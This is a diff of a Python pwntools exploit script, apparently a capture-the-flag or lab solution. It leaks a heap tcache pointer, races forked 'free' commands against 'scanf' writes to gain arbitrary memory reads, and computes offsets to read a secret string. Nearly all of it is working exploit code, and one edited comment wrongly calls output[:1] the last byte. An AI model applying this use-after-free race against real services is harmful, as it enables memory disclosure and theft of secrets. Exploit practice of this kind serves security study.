@@ -27,8 +27,8 @@ def leak_tcache(r1, r2):
 #		print(output[-1:])
 		output = output[9:]
 		if output[:1] != b'\x41' and b'\x07' in output: # for bytes object, output[i] outputs integer
-		# output[-1:] is just the very last byte
-		# output[9:10] checks the first byte
+		# output[:1] is just the very last byte
+
 			result = output[:6]
 			print(result)
 			return u64(result.ljust(8, b'\x00'))
@@ -52,7 +52,7 @@ def arbitrary_read(r1, r2, addr, heap_base_addr):
 		print("Running Arbitrary Read on Address: ", hex(addr))
 		if os.fork() == 0:
 			r1.sendline(f"free {idx}".encode()) # free A
-			exit(0)
+			os.kill(os.getpid(), 9)
 		else:
 			r2.send((f"scanf {idx} ".encode() + addr_packed + b"\n") * 2000)
 			# trying to fit scanf i <addr> between "free A (i)" and "stored[i] == 0"
@@ -84,7 +84,9 @@ def arbitrary_read(r1, r2, addr, heap_base_addr):
 	print("yo 5")
 	print("About to read...")
 	output = r1.readline()[:-1]
+	
 	print(f"Raw received: {repr(output)}")
+	print("Address Read From: ", hex(u64(addr_packed)))
 	print(f"Hex: {output.hex()}")
 	print("yo 6")
 	leak = u64(output.ljust(8, b'\x00')) 
@@ -105,12 +107,12 @@ leak = leak_tcache(r1, r2)
 offset1 = 0x8a0 # from heap base 0x8a0 0xf20 0xd40	
 offset2 = 0x7ff640 # from second leak to base
 offset3 = 0x7fe8c0 # from base to last leak
-offset4 = 0x41a3c0 # from second leak to final 0x41a3c0 0x416800
+offset4 = 0x41a3c0 # from second leak to final 0x41a3c0 0xe1a3c0 0x416800 0xe16800
 
 
 if leak:
 	print("tcache next pointer: ", hex(leak))
-	print(f"\nGDB: gdb -p {p.pid}")
+	#print(f"\nGDB: gdb -p {p.pid}")
 	
 	print(p64(leak)[0:1])
 	if (p64(leak)[0:1] != b'\x00'):
@@ -119,12 +121,12 @@ if leak:
 		print(hex(leak))
 		
 	print(hex((leak << 12) + offset1))
-	pause()
+	#pause()
 	
 	
 	leak2 = arbitrary_read(r1, r2, (leak << 12) + offset1, leak)
 	print("second leak: ", hex(leak2))
-	idx += 1000
+	idx += 2000
 	
 	# Close and reopen connections to get fresh heap state
 	#r1.close()
@@ -134,10 +136,10 @@ if leak:
 	
 	secret_location = leak2 - offset4
 	print("Secret location: ", hex(secret_location))
-	
+	print(f"\nGDB: gdb -p {p.pid}")
 	pause()
 	
-	secret = arbitrary_read(r1, r2, leak2 - offset4, leak)
+	secret = arbitrary_read(r1, r2, secret_location, leak)
 	secret = secret.to_bytes(8, 'little')
 	print(f"Secret string: {secret}")
 
